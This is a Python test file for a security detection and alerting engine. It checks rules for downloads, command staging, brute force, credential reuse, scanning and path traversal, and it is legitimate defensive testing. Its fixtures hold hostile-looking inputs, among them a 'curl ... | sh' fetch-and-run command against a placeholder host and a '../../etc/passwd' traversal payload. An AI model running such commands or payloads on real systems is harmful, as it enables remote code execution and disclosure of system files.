from datetime import datetime, timezone

from aegis_nexus.alerts import AlertStore
from aegis_nexus.detection import DETECTION_SCHEMA_VERSION, DetectionEngine


def _event(event_id="evt-1", command="wget http://example.invalid/a"):
    return {
        "id": event_id,
        "timestamp": datetime(2026, 9, 23, tzinfo=timezone.utc).isoformat(),
        "source_ip": "203.0.113.10",
        "session_id": "session-1",
        "event_type": "command",
        "observed": {"source_ip": "203.0.113.10", "command": command},
    }


def test_detection_schema_separates_severity_confidence_and_evidence():
    findings = DetectionEngine().evaluate(_event())
    finding = next(item for item in findings if item["rule_id"] == "download_attempt")
    assert finding["schema_version"] == DETECTION_SCHEMA_VERSION
    assert finding["severity"] == "medium"
    assert finding["confidence"] == 90
    assert finding["evidence"] == [{"type": "event", "id": "evt-1"}]


def test_command_staging_rule_is_evidence_backed():
    findings = DetectionEngine().evaluate(_event(command="curl http://x.invalid/a | sh -c cat"))
    ids = {item["rule_id"] for item in findings}
    assert "download_attempt" in ids
    assert "command_staging_detected" in ids


def test_suricata_rule_uses_observed_severity_only():
    event = _event()
    event["event_type"] = "ids.alert"
    event["observed"] = {
        "source_ip": "203.0.113.10",
        "alert": {"signature": "fixture", "severity": 1},
    }
    findings = DetectionEngine().evaluate(event)
    finding = next(item for item in findings if item["rule_id"] == "suricata_high_severity")
    assert finding["confidence"] == 95
    assert "actor" not in finding
    assert "attribution" not in finding


def test_alert_store_deduplicates_open_alert_and_preserves_evidence(tmp_path):
    store = AlertStore(str(tmp_path / "aegis.db"))
    engine = DetectionEngine()
    first = next(item for item in engine.evaluate(_event("evt-1")) if item["rule_id"] == "download_attempt")
    second = next(item for item in engine.evaluate(_event("evt-2")) if item["rule_id"] == "download_attempt")
    a = store.record(first, "2026-09-23T10:00:00+00:00")
    b = store.record(second, "2026-09-23T10:01:00+00:00")
    assert a["id"] == b["id"]
    assert b["occurrence_count"] == 2
    assert {item["id"] for item in b["evidence"]} == {"evt-1", "evt-2"}


def test_alert_lifecycle_tags_and_notes(tmp_path):
    store = AlertStore(str(tmp_path / "aegis.db"))
    finding = next(item for item in DetectionEngine().evaluate(_event()) if item["rule_id"] == "download_attempt")
    alert = store.record(finding, "2026-09-23T10:00:00+00:00")
    updated = store.update(alert["id"], status="investigating", tags=["triage", "download"])
    assert updated["status"] == "investigating"
    assert updated["tags"] == ["download", "triage"]
    noted = store.add_note(alert["id"], "Validated against captured event.")
    assert noted["notes"][0]["body"] == "Validated against captured event."


def _context_event(event_id, minute, *, event_type="credential", source_ip="203.0.113.10", port=22, username="root", path=None, fingerprint=None):
    observed = {
        "source_ip": source_ip,
        "service": "http" if path is not None else "ssh",
        "protocol": "tcp",
        "destination_port": port,
    }
    if event_type == "credential":
        observed["credential"] = {
            "username": username,
            "password_sha256": fingerprint or ("a" * 64),
            "password_complete": True,
        }
    if path is not None:
        observed["path"] = path
    return {
        "id": event_id,
        "timestamp": datetime(2026, 9, 23, 10, minute, tzinfo=timezone.utc).isoformat(),
        "source_ip": source_ip,
        "session_id": "session-" + source_ip.replace(".", "-") + "-" + str(port),
        "destination_port": port,
        "service": observed["service"],
        "event_type": event_type,
        "observed": observed,
    }


def test_multiple_auth_failures_requires_threshold_and_preserves_window_evidence():
    engine = DetectionEngine()
    events = [_context_event(f"auth-{i}", i) for i in range(5)]
    below = engine.evaluate(events[3], events[:4])
    assert "multiple_auth_failures" not in {item["rule_id"] for item in below}

    findings = engine.evaluate(events[4], events)
    finding = next(item for item in findings if item["rule_id"] == "multiple_auth_failures")
    assert finding["confidence"] == 95
    assert {item["id"] for item in finding["evidence"]} == {f"auth-{i}" for i in range(5)}


def test_credential_bruteforce_requires_attempt_volume_and_username_breadth():
    engine = DetectionEngine()
    events = [
        _context_event(f"brute-{i}", i, username=f"user-{i % 5}")
        for i in range(10)
    ]
    findings = engine.evaluate(events[-1], events)
    ids = {item["rule_id"] for item in findings}
    assert "credential_bruteforce" in ids

    single_user = [
        _context_event(f"single-{i}", i, username="root")
        for i in range(10)
    ]
    ids = {item["rule_id"] for item in engine.evaluate(single_user[-1], single_user)}
    assert "credential_bruteforce" not in ids


def test_credential_reuse_uses_fingerprint_across_sources_without_attribution():
    engine = DetectionEngine()
    fingerprint = "b" * 64
    first = _context_event("reuse-1", 0, source_ip="203.0.113.10", fingerprint=fingerprint)
    second = _context_event("reuse-2", 1, source_ip="203.0.113.11", fingerprint=fingerprint)
    findings = engine.evaluate(second, [first, second])
    finding = next(item for item in findings if item["rule_id"] == "credential_reuse")
    assert {item["id"] for item in finding["evidence"]} == {"reuse-1", "reuse-2"}
    assert "actor" not in finding
    assert "attribution" not in finding
    assert fingerprint not in str(finding)


def test_web_scanning_and_path_traversal_sequence_are_threshold_based():
    engine = DetectionEngine()
    scans = [
        _context_event(f"web-{i}", i % 5, event_type="web.request", port=8080, path=f"/probe-{i}")
        for i in range(8)
    ]
    ids = {item["rule_id"] for item in engine.evaluate(scans[-1], scans)}
    assert "web_scanning" in ids

    traversals = []
    for i in range(3):
        item = _context_event(f"trav-{i}", i, event_type="web.payload", port=8080, path="/viewer")
        item["observed"]["payload"] = "../../etc/passwd"
        traversals.append(item)
    ids = {item["rule_id"] for item in engine.evaluate(traversals[-1], traversals)}
    assert "path_traversal_sequence" in ids


def test_rapid_port_sequence_and_recon_burst_need_breadth():
    engine = DetectionEngine()
    rapid = [
        _context_event(f"port-{i}", 0, event_type="connection", port=20 + i)
        for i in range(5)
    ]
    ids = {item["rule_id"] for item in engine.evaluate(rapid[-1], rapid)}
    assert "rapid_port_sequence" in ids

    recon = []
    for i in range(15):
        item = _context_event(f"recon-{i}", i % 5, event_type="connection", port=1000 + (i % 5))
        item["observed"]["service"] = ["ssh", "http", "ftp"][i % 3]
        item["service"] = item["observed"]["service"]
        recon.append(item)
    ids = {item["rule_id"] for item in engine.evaluate(recon[-1], recon)}
    assert "recon_burst" in ids
